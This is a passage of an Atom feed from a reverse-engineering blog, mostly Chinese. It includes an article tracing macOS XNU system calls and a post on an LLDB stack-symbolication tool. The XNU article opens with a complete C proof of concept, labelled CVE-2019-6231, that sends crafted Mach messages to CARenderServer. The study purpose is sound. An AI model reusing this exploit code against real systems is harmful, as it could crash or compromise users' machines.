<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-03-06T02:47:23.041Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
